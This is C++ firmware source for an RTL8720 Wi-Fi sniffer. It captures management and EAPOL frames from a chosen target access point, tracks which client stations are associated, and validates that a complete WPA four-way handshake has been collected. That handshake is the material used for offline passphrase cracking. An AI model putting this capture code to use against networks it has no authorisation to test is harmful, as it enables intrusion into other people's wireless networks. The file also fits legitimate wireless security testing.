        completeHandshakeLED();
      } else {
        Serial.println(F("[NonBlocking] Handshake capture failed"));
      }
      
      // Clean up state
      sniffer_active = false;
      readyToSniff = false;
      extern bool hs_sniffer_running;
      hs_sniffer_running = false;
      g_captureState = CAPTURE_STATE_IDLE;
      
      Serial.println(F("[NonBlocking] Capture state machine completed"));
      break;
      
    default:
      break;
  }
}

// Helper function: extract frame type and subtype from the first two bytes.
void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype) {
  unsigned short fc = packet[0] | (packet[1] << 8);
  type = (fc >> 2) & 0x03;
  subtype = (fc >> 4) & 0x0F;
}

void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param) {
  (void)param;
  sniffCallbackTriggered = true;
  if (!packet || length < 24) { return; }
  
  static unsigned long lastDebugLog = 0;
  static int callbackCount = 0;
  static int totalFramesProcessed = 0;
  callbackCount++;
  totalFramesProcessed++;
  if (g_verboseHandshakeLog && (millis() - lastDebugLog > 5000)) {
    Serial.print(F("[Handshake] Callbacks triggered: "));
    Serial.print(callbackCount);
    Serial.print(F(", handshake frames: "));
    Serial.print(capturedHandshake.frameCount);
    Serial.print(F("/4, management frames: "));
    Serial.print(capturedManagement.frameCount);
    Serial.print(F("/10, total processed: "));
    Serial.println(totalFramesProcessed);
    lastDebugLog = millis();
    callbackCount = 0;
  }
  
  unsigned int type, subtype;
  get_frame_type_subtype(packet, type, subtype);
  
  // Management frames capture and selective client learning
  if (type == 0) {
    if (g_verboseHandshakeLog) {
      uint16_t fcdbg = packet[0] | (packet[1] << 8);
      Serial.print(F("[MGMT] subtype=")); Serial.print((fcdbg>>4)&0xF);
      Serial.print(F(" len=")); Serial.print(length);
      Serial.print(F(" bssid=")); if (length>=22) Serial.println(macToString(&packet[16],6)); else Serial.println("-");
    }
    // Capture common mgmt frames for UI/report
    if (subtype == 8 || subtype == 5 || subtype == 0 || subtype == 4) {
      bool isTargetBSSID = false;
      if (length >= 16) {
        bool standardMatch = true;
        for (int j = 0; j < 6; j++) {
          if (packet[10 + j] != _selectedNetwork.bssid[j]) { standardMatch = false; break; }
        }
        isTargetBSSID = standardMatch;
        if (!isTargetBSSID && length >= 12) {
          bool sourceMatch = true;
          for (int j = 0; j < 6; j++) {
            if (packet[6 + j] != _selectedNetwork.bssid[j]) { sourceMatch = false; break; }
          }
          isTargetBSSID = sourceMatch;
        }
        if (!isTargetBSSID && length >= 6) {
          bool destMatch = true;
          for (int j = 0; j < 6; j++) {
            if (packet[0 + j] != _selectedNetwork.bssid[j]) { destMatch = false; break; }
          }
          if (destMatch) isTargetBSSID = true;
        }
      }
      if (((isTargetBSSID) || (!strictCaptureMode && allowAnyMgmtFrames)) && capturedManagement.frameCount < MAX_MANAGEMENT_FRAMES) {
        ManagementFrame *mf = &capturedManagement.frames[capturedManagement.frameCount];
        mf->length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
        memcpy(mf->data, packet, mf->length);
        capturedManagement.frameCount++;
      }
      // 不在探测与信标阶段学习客户端，避免误将未关联STA加入
    }
    // 仅在与关联状态强相关的管理帧中学习客户端，且必须绑定目标BSSID
    if (length >= 24) {
      const uint8_t *da = &packet[4];
      const uint8_t *sa = &packet[10];
      const uint8_t *bssid = &packet[16];
      bool bssidMatch = true; for (int j=0;j<6;j++){ if (bssid[j] != _selectedNetwork.bssid[j]) { bssidMatch=false; break; } }
      if (bssidMatch) {
        // Association/Reassociation and state-change learning tied to target BSSID
        // 0: Assoc Req (SA=STA), 1: Assoc Resp (DA=STA)
        // 2: Reassoc Req (SA=STA), 3: Reassoc Resp (DA=STA)
        if (subtype == 0 || subtype == 2) {
          if (macIsUnicast(sa) && !macEquals6(sa, _selectedNetwork.bssid)) { addKnownClient(sa); touchKnownClient(sa); }
        } else if (subtype == 1 || subtype == 3) {
          if (macIsUnicast(da) && !macEquals6(da, _selectedNetwork.bssid)) {
            addKnownClient(da);
            touchKnownClient(da);
            uint16_t statusCode = 0xFFFF;
            if (parseAssocRespStatus(packet, length, statusCode)) {
              if (statusCode == 0) {
                // Only mark "recent association" on successful AssocResp/ReassocResp
                markAuthAssocSeen(da);
                uint8_t idx = findKnownClientIndex(da);
                if (idx != 255) knownClientAssocRespLastMs[idx] = millis();
                if (g_verboseHandshakeLog) { Serial.print(F("[MGMT][AssocResp] success for STA ")); Serial.println(macToString(da,6)); }
              } else {
                if (g_verboseHandshakeLog) { Serial.print(F("[MGMT][AssocResp] non-success status=")); Serial.println(statusCode); }
              }
            }
          }
        }
        // 10: Disassoc, 12: Deauth (either address may be the STA)
        if (subtype == 10 || subtype == 12) {
          if (macIsUnicast(sa) && !macEquals6(sa, _selectedNetwork.bssid)) { addKnownClient(sa); touchKnownClient(sa); }
          if (macIsUnicast(da) && !macEquals6(da, _selectedNetwork.bssid)) { addKnownClient(da); touchKnownClient(da); }
        }
        // 11: Auth (heuristic: if SA==AP then DA is STA, else SA is STA) -- no longer used for "recent association" marking
        if (subtype == 11) {
          bool saIsAP = macEquals6(sa, _selectedNetwork.bssid);
          const uint8_t* sta = saIsAP ? da : sa;
          if (macIsUnicast(sta) && !macEquals6(sta, _selectedNetwork.bssid)) { addKnownClient(sta); touchKnownClient(sta); }
        }
      }
    }
  }
  
  // EAPOL detection (DATA frames only)
  if (type != 2) { return; }
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  bool isEAPOL = false;
  bool isFromTargetBSSID = false;
  if (length >= 24) {
    const uint8_t *da, *sa, *bssid;
    if (extractAddrsForDataFrame(packet, length, da, sa, bssid)) {
      bool bssidMatch = true;
      for (int j=0;j<6;j++){ if (bssid[j] != _selectedNetwork.bssid[j]) { bssidMatch=false; break; } }
      if (bssidMatch) {
        isFromTargetBSSID = true;
      }
      if (g_verboseHandshakeLog) {
        uint16_t fcdbg = packet[0] | (packet[1] << 8);
        bool toDS = (fcdbg & (1<<8))!=0; bool fromDS = (fcdbg & (1<<9))!=0;
        Serial.print(F("[DATA] toDS=")); Serial.print(toDS); Serial.print(F(" fromDS=")); Serial.print(fromDS);
        Serial.print(F(" DA=")); Serial.print(macToString(da,6)); Serial.print(F(" SA=")); Serial.print(macToString(sa,6));
        Serial.print(F(" BSSID=")); Serial.print(macToString(bssid,6)); Serial.print(F(" bssidMatch=")); Serial.println(isFromTargetBSSID?"Y":"N");
      }
    }
  }
  // In strict mode, first filter based on derived BSSID to avoid cross-AP false positives
  if (length >= 24 && strictCaptureMode) {
    if (!isFromTargetBSSID) {
      if (g_verboseHandshakeLog) Serial.println(F("[EAPOL][DROP] BSSID mismatch for target"));
      return;
    }
  }
  // Gate by AP involvement when strict mode is on (more robust across DS bit layouts)
  if (length >= 24 && strictCaptureMode) {
    // For data frames, Addr1/Addr2 are at offsets 4 and 10 respectively
    const uint8_t* da_apchk = &packet[4];
    const uint8_t* sa_apchk = &packet[10];
    bool apInvolved = macEquals6(da_apchk, _selectedNetwork.bssid) || macEquals6(sa_apchk, _selectedNetwork.bssid);
    if (!apInvolved) {
      if (g_verboseHandshakeLog) Serial.println(F("[EAPOL][DROP] AP not involved for target BSSID"));
      return;
    }
  }
  // Accept shorter frames too; some EAPOL frames can be compact
  if (length < 24 || length > 2000) { return; }
  for (unsigned int i = 0; i <= length - seq_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < seq_len; j++) { if (packet[i + j] != eapol_sequence[j]) { match = false; break; } }
    if (match) { isEAPOL = true; break; }
  }
  bool hasEAPOLSignature = false;
  if (!isEAPOL) {
    for (unsigned int i = 0; i <= length - 2; i++) { if (packet[i] == 0x88 && packet[i + 1] == 0x8E) { hasEAPOLSignature = true; break; } }
    if (hasEAPOLSignature) isEAPOL = true;
  }
  if (!isEAPOL) return;
  ParsedEapolInfo info; bool parsed = parseEapol(packet, length, info); if (!parsed && hasEAPOLSignature) parsed = parseEapolFromEthertype(packet, length, info);
  if (!parsed) return;
  if (g_verboseHandshakeLog) {
    Serial.print(F("[EAPOL] parsed desc=")); Serial.print(info.descriptorType);
    Serial.print(F(" keyInfo=0x")); Serial.print(info.keyInfo, HEX);
    Serial.print(F(" MIC=")); Serial.print(info.hasMic);
    Serial.print(F(" ACK=")); Serial.print(info.hasAck);
    Serial.print(F(" Install=")); Serial.print(info.hasInstall);
    Serial.print(F(" Secure=")); Serial.print(info.hasSecure);
  }
  // Prefer pairwise EAPOL-Key; allow first frame to bootstrap learning
  bool isPairwise = (info.descriptorType == 0x02) && ((info.keyInfo & (1 << 3)) != 0);
  if (!isPairwise && capturedHandshake.frameCount > 0) return;
  const uint8_t* da = &packet[4];
  const uint8_t* sa = &packet[10];
  if (!macIsUnicast(da) || !macIsUnicast(sa)) return;
  // Identify STA (non-AP). Some devices use randomized (locally-admin) MACs legitimately; do not reject.
  // const uint8_t* staMac = macEquals6(sa, _selectedNetwork.bssid) ? da : sa;
  // Only learn clients when confirmed the data frame belongs to target BSSID, avoid cross-AP false adds
  if (isFromTargetBSSID) {
    if (!macEquals6(sa, _selectedNetwork.bssid)) { addKnownClient(sa); touchKnownClient(sa); }
    if (!macEquals6(da, _selectedNetwork.bssid)) { addKnownClient(da); touchKnownClient(da); }
  }
  HandshakeFrame newFrame; newFrame.length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE; memcpy(newFrame.data, packet, newFrame.length);
  unsigned short seqControl = getSequenceControl(newFrame.data, newFrame.length);
  bool duplicate = false; unsigned long currentTime = millis();
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame *stored = &capturedHandshake.frames[i];
    unsigned short storedSeq = getSequenceControl(stored->data, stored->length);
    if (storedSeq == seqControl && stored->length == newFrame.length) {
      if (memcmp(stored->data, newFrame.data, newFrame.length) == 0) { duplicate = true; break; }
      if (currentTime - stored->timestamp < 100) { duplicate = true; break; }
    }
    ParsedEapolInfo storedInfo, newInfo;
    bool storedParsed = parseEapol(stored->data, stored->length, storedInfo); if (!storedParsed) storedParsed = parseEapolFromEthertype(stored->data, stored->length, storedInfo);
    bool newParsed = parsed ? true : parseEapol(newFrame.data, newFrame.length, newInfo); if (!newParsed) newParsed = parseEapolFromEthertype(newFrame.data, newFrame.length, newInfo);
    if (storedParsed && newParsed) {
      bool sameReplay = memcmp(storedInfo.replayCounter, newInfo.replayCounter, 8) == 0;
      bool sameDir = storedInfo.isFromAP == newInfo.isFromAP;
      bool sameDesc = storedInfo.descriptorType == newInfo.descriptorType;
      bool sameKeyInfo = storedInfo.keyInfo == newInfo.keyInfo;
      if (sameReplay && sameDir && sameDesc && sameKeyInfo) { duplicate = true; break; }
    }
  }
  uint8_t msgType = 0; ParsedEapolInfo cinfo; bool cparsed = parsed ? true : parseEapol(newFrame.data, newFrame.length, cinfo); if (!cparsed) cparsed = parseEapolFromEthertype(newFrame.data, newFrame.length, cinfo); if (cparsed) { bool m1 = cinfo.isFromAP && cinfo.descriptorType == 0x02 && cinfo.hasAck && !cinfo.hasMic && !cinfo.hasInstall; bool m2 = !cinfo.isFromAP && cinfo.descriptorType == 0x02 && cinfo.hasMic && !cinfo.hasAck && !cinfo.hasInstall; bool m3 = cinfo.isFromAP && cinfo.hasMic && cinfo.hasAck && cinfo.hasInstall; bool m4 = !cinfo.isFromAP && cinfo.hasMic && !cinfo.hasAck && !cinfo.hasInstall && cinfo.hasSecure; if (m1) msgType = 1; else if (m2) msgType = 2; else if (m3) msgType = 3; else if (m4) msgType = 4; else msgType = 0; }
  if (!duplicate && capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES) {
    memcpy(capturedHandshake.frames[capturedHandshake.frameCount].data, newFrame.data, newFrame.length);
    capturedHandshake.frames[capturedHandshake.frameCount].length = newFrame.length;
    capturedHandshake.frames[capturedHandshake.frameCount].timestamp = currentTime;
    capturedHandshake.frames[capturedHandshake.frameCount].sequence = seqControl;
    capturedHandshake.frames[capturedHandshake.frameCount].messageType = msgType;
    capturedHandshake.frameCount++;
  }
}

// Handshake integrity check function implementation
bool isHandshakeComplete() {
  if (capturedHandshake.frameCount < 2) return false;
  bool hasMessage1 = false, hasMessage2 = false, hasMessage3 = false, hasMessage4 = false;
  bool staLocked = false; uint8_t staMac[6] = {0};
  bool apReplayInit = false, staReplayInit = false; uint8_t apReplayPrev[8] = {0}, staReplayPrev[8] = {0};
  // Record STA consistency derived from DS bits (more reliable)
  bool staConsistent = true;
  // Save M1..M4 parse info for precise replay counter verification
  ParsedEapolInfo mInfos[4]; uint8_t mCount = 0;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) continue;
    // Only accept Pairwise EAPOL-Key
    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
    // Derived BSSID for each frame must equal the target
    const uint8_t *dda,*ssa,*bb;
    if (!extractAddrsForDataFrame(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, dda, ssa, bb)) continue;
    bool bssidOk = true; for (int j=0;j<6;j++){ if (bb[j] != _selectedNetwork.bssid[j]) { bssidOk=false; break; } }
    if (!bssidOk) continue;
    // Lock and verify STA MAC consistency (extracted via DS bits)
    const uint8_t *da = &capturedHandshake.frames[i].data[4];
    const uint8_t *sa = &capturedHandshake.frames[i].data[10];
    uint16_t fc = capturedHandshake.frames[i].data[0] | (capturedHandshake.frames[i].data[1] << 8);
    bool toDS = (fc & (1 << 8)) != 0; bool fromDS = (fc & (1 << 9)) != 0;
    const uint8_t* thisSta = (!toDS && fromDS) ? dda : (toDS && !fromDS) ? ssa : (einfo.isFromAP ? da : sa);
    if (!staLocked) { for (int j=0;j<6;j++) staMac[j] = thisSta[j]; staLocked = true; }
    else { bool same=true; for (int j=0;j<6;j++){ if (staMac[j]!=thisSta[j]) { same=false; break; } } if (!same) { staConsistent = false; continue; } }
    // Strict M1-M4 Key Info combination
    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
    // Replay counter monotonicity (for AP and STA directions separately)
    if (m1 || m3) {
      if (apReplayInit) { if (memcmp(einfo.replayCounter, apReplayPrev, 8) < 0) continue; }
      memcpy(apReplayPrev, einfo.replayCounter, 8); apReplayInit = true;
    } else if (m2 || m4) {
      if (staReplayInit) { if (memcmp(einfo.replayCounter, staReplayPrev, 8) < 0) continue; }
      memcpy(staReplayPrev, einfo.replayCounter, 8); staReplayInit = true;
    }
    hasMessage1 = hasMessage1 || m1;
    hasMessage2 = hasMessage2 || m2;
    hasMessage3 = hasMessage3 || m3;
    hasMessage4 = hasMessage4 || m4;
    if (m1 || m2 || m3 || m4) { if (mCount < 4) mInfos[mCount++] = einfo; }
  }
  if (!(staLocked && staConsistent && hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)) {
    if (g_verboseHandshakeLog) {
      Serial.print(F("[CHK-FAIL] M-set/STA: staLocked=")); Serial.print(staLocked);
      Serial.print(F(" staConsistent=")); Serial.print(staConsistent);
      Serial.print(F(" M1-4=")); Serial.print(hasMessage1); Serial.print(hasMessage2); Serial.print(hasMessage3); Serial.println(hasMessage4);
    }
    return false;
  }
  if (g_verboseHandshakeLog) Serial.println(F("[CHK] M1-4 present & STA consistent"));
  // Precise replay counter mode: M1 and M2 equal, M3 and M4 both are M1+1 (big-endian)
  const uint8_t *rcM1 = nullptr, *rcM2 = nullptr, *rcM3 = nullptr, *rcM4 = nullptr;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) continue;
    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
    if (m1 && !rcM1) rcM1 = einfo.replayCounter;
    if (m2 && !rcM2) rcM2 = einfo.replayCounter;
    if (m3 && !rcM3) rcM3 = einfo.replayCounter;
    if (m4 && !rcM4) rcM4 = einfo.replayCounter;
  }
  if (!(rcM1 && rcM2 && rcM3 && rcM4)) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] Replay pointers missing for one or more M1..M4"));
    return false;
  }
  if (!rcEquals(rcM1, rcM2)) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] rc(M1) != rc(M2)"));
    return false;
  }
  // Some AP implementations don't strictly +1 replay counters for M3/M4, instead keeping them equal to M1/M2 or +1
  bool m3Ok = rcEquals(rcM3, rcM1) || rcIsPlusOne(rcM3, rcM1);
  bool m4Ok = rcEquals(rcM4, rcM2) || rcIsPlusOne(rcM4, rcM1);
  if (!m3Ok) { if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] rc(M3) not equal to M1 or M1+1")); return false; }
  if (!m4Ok) { if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] rc(M4) not equal to M2 or M1+1")); return false; }
  if (g_verboseHandshakeLog) Serial.println(F("[CHK] Replay counters pattern OK"));
  // Requires recent Auth/Assoc corroboration: the STA must have appeared in Auth/Assoc within the recent window
  const unsigned long nowMs = millis();
  uint8_t idx = findKnownClientIndex(staMac);
  if (idx == 255) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] STA not in knownClients table"));
    return false;
  }
  // Only accept the most recent successful AssocResp/ReassocResp as evidence of "recent network join"
  const unsigned long windowMs = 6000; // 6-second window, stricter
  if (knownClientAuthAssocLastMs[idx] == 0) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] No recent AssocResp/ReassocResp observed for STA"));
    return false;
  }
  if ((nowMs - knownClientAuthAssocLastMs[idx]) > windowMs) {
    if (g_verboseHandshakeLog) {
      Serial.print(F("[CHK-FAIL] AssocResp/ReassocResp too old, delta(ms)="));
      Serial.println(nowMs - knownClientAuthAssocLastMs[idx]);
    }
    return false;
  }
  // 进一步要求：明确的 AssocResp 成功时间戳（与上字段一致时通过）
  if (knownClientAssocRespLastMs[idx] == 0 || (nowMs - knownClientAssocRespLastMs[idx]) > windowMs) {
    if (g_verboseHandshakeLog) Serial.println(F("[CHK-FAIL] No recent successful AssocResp within window"));
    return false;
  }
  if (g_verboseHandshakeLog) Serial.println(F("[CHK] Recent AssocResp/ReassocResp within window OK"));
  return true;
}

// Quick capture mode handshake integrity check (keeps strict validation but removes time limits)
bool isHandshakeCompleteQuickCapture() {
  if (capturedHandshake.frameCount < 2) return false;
  bool hasMessage1 = false, hasMessage2 = false, hasMessage3 = false, hasMessage4 = false;
  bool staLocked = false; uint8_t staMac[6] = {0};
  bool apReplayInit = false, staReplayInit = false; uint8_t apReplayPrev[8] = {0}, staReplayPrev[8] = {0};
  // Record STA consistency derived from DS bits (more reliable)
  bool staConsistent = true;
  // Save M1..M4 parse info for precise replay counter verification
  ParsedEapolInfo mInfos[4]; uint8_t mCount = 0;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) continue;
    // Only accept Pairwise EAPOL-Key
    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
    // Derived BSSID for each frame must equal the target
    const uint8_t *dda,*ssa,*bb;
    if (!extractAddrsForDataFrame(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, dda, ssa, bb)) continue;
    bool bssidOk = true; for (int j=0;j<6;j++){ if (bb[j] != _selectedNetwork.bssid[j]) { bssidOk=false; break; } }
    if (!bssidOk) continue;
    // Lock and verify STA MAC consistency (extracted via DS bits)
    const uint8_t *da = &capturedHandshake.frames[i].data[4];
    const uint8_t *sa = &capturedHandshake.frames[i].data[10];
    uint16_t fc = capturedHandshake.frames[i].data[0] | (capturedHandshake.frames[i].data[1] << 8);
    bool toDS = (fc & (1 << 8)) != 0; bool fromDS = (fc & (1 << 9)) != 0;
    const uint8_t* thisSta = (!toDS && fromDS) ? dda : (toDS && !fromDS) ? ssa : (einfo.isFromAP ? da : sa);
    if (!staLocked) { for (int j=0;j<6;j++) staMac[j] = thisSta[j]; staLocked = true; }
    else { bool same=true; for (int j=0;j<6;j++){ if (staMac[j]!=thisSta[j]) { same=false; break; } } if (!same) { staConsistent = false; continue; } }
    // Strict M1-M4 Key Info combination
    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
    // Replay counter monotonicity (for AP and STA directions separately)
    if (m1 || m3) {
      if (apReplayInit) { if (memcmp(einfo.replayCounter, apReplayPrev, 8) < 0) continue; }
      memcpy(apReplayPrev, einfo.replayCounter, 8); apReplayInit = true;
    } else if (m2 || m4) {
      if (staReplayInit) { if (memcmp(einfo.replayCounter, staReplayPrev, 8) < 0) continue; }
      memcpy(staReplayPrev, einfo.replayCounter, 8); staReplayInit = true;
    }
    hasMessage1 = hasMessage1 || m1;
    hasMessage2 = hasMessage2 || m2;
    hasMessage3 = hasMessage3 || m3;
    hasMessage4 = hasMessage4 || m4;
    if (m1 || m2 || m3 || m4) { if (mCount < 4) mInfos[mCount++] = einfo; }
  }
  if (!(staLocked && staConsistent && hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)) {
    if (g_verboseHandshakeLog) {
      Serial.print(F("[QuickCapture-CHK-FAIL] M-set/STA: staLocked=")); Serial.print(staLocked);
      Serial.print(F(" staConsistent=")); Serial.print(staConsistent);
      Serial.print(F(" M1-4=")); Serial.print(hasMessage1); Serial.print(hasMessage2); Serial.print(hasMessage3); Serial.println(hasMessage4);
    }
    return false;
  }
  if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK] M1-4 present & STA consistent"));
  // Precise replay counter mode: M1 and M2 equal, M3 and M4 both are M1+1 (big-endian)
  const uint8_t *rcM1 = nullptr, *rcM2 = nullptr, *rcM3 = nullptr, *rcM4 = nullptr;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) continue;
    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
    if (m1 && !rcM1) rcM1 = einfo.replayCounter;
    if (m2 && !rcM2) rcM2 = einfo.replayCounter;
    if (m3 && !rcM3) rcM3 = einfo.replayCounter;
    if (m4 && !rcM4) rcM4 = einfo.replayCounter;
  }
  if (!(rcM1 && rcM2 && rcM3 && rcM4)) {
    if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK-FAIL] Replay pointers missing for one or more M1..M4"));
    return false;
  }
  if (!rcEquals(rcM1, rcM2)) {
    if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK-FAIL] rc(M1) != rc(M2)"));
    return false;
  }
  // Some AP implementations don't strictly +1 replay counters for M3/M4, instead keeping them equal to M1/M2 or +1
  bool m3Ok = rcEquals(rcM3, rcM1) || rcIsPlusOne(rcM3, rcM1);
  bool m4Ok = rcEquals(rcM4, rcM2) || rcIsPlusOne(rcM4, rcM1);
  if (!m3Ok) { if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK-FAIL] rc(M3) not equal to M1 or M1+1")); return false; }
  if (!m4Ok) { if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK-FAIL] rc(M4) not equal to M2 or M1+1")); return false; }
  if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK] Replay counters pattern OK"));
  
  // Quick capture mode: remove time window limit, treat as success as long as a valid handshake exists
  // No longer require recent Auth/Assoc evidence, as quick capture may acquire these frames at different times
  
  if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK] Handshake validation passed"));
  return true;
}

// 判断是否已捕获到来自 AP 与 Client 双向的 EAPOL
bool hasBothHandshakeDirections() {
  bool seenAP = false, seenClient = false;
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    ParsedEapolInfo einfo;
    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
    if (p) {
      if (einfo.isFromAP) seenAP = true; else seenClient = true;
    }
  }
  return seenAP && seenClient;
}

// This verification logic was removed after v2.2 to improve handshake save success rate, but may increase false positives and invalid packets

// // Only validate M1-M4 format, same STA, BSSID match, and replay counter pattern; no Auth/Assoc near-time evidence required
// static bool isFourWayStructurallyValid() {
//   if (capturedHandshake.frameCount < 4) return false;
//   bool hasMessage1 = false, hasMessage2 = false, hasMessage3 = false, hasMessage4 = false;
//   bool staLocked = false; uint8_t staMac[6] = {0};
//   bool staConsistent = true;
//   const uint8_t *rcM1 = nullptr, *rcM2 = nullptr, *rcM3 = nullptr, *rcM4 = nullptr;
//   for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
//     ParsedEapolInfo einfo;
//     bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
//     if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
//     if (!p) continue;
//     if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
//     // Derived BSSID must match target
//     const uint8_t *da, *sa, *bb; if (!extractAddrsForDataFrame(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, da, sa, bb)) continue;
//     bool bssidOk = true; for (int j=0;j<6;j++){ if (bb[j] != _selectedNetwork.bssid[j]) { bssidOk=false; break; } } if (!bssidOk) continue;
//     uint16_t fc = capturedHandshake.frames[i].data[0] | (capturedHandshake.frames[i].data[1] << 8);
//     bool toDS = (fc & (1 << 8)) != 0; bool fromDS = (fc & (1 << 9)) != 0;
//     const uint8_t* thisSta = (!toDS && fromDS) ? da : (toDS && !fromDS) ? sa : (einfo.isFromAP ? da : sa);
//     if (!staLocked) { for (int j=0;j<6;j++) staMac[j] = thisSta[j]; staLocked = true; }
//     else { bool same=true; for (int j=0;j<6;j++){ if (staMac[j]!=thisSta[j]) { same=false; break; } } if (!same) { staConsistent = false; continue; } }
//     bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
//     bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
//     bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
//     bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
//     hasMessage1 = hasMessage1 || m1; if (m1 && !rcM1) rcM1 = einfo.replayCounter;
//     hasMessage2 = hasMessage2 || m2; if (m2 && !rcM2) rcM2 = einfo.replayCounter;
//     hasMessage3 = hasMessage3 || m3; if (m3 && !rcM3) rcM3 = einfo.replayCounter;
//     hasMessage4 = hasMessage4 || m4; if (m4 && !rcM4) rcM4 = einfo.replayCounter;
//   }
//   if (!(staLocked && staConsistent && hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)) return false;
//   if (!(rcM1 && rcM2 && rcM3 && rcM4)) return false;
//   if (!rcEquals(rcM1, rcM2)) return false;
//   if (!rcIsPlusOne(rcM3, rcM1)) return false;
//   if (!rcIsPlusOne(rcM4, rcM1)) return false;
//   return true;
// }

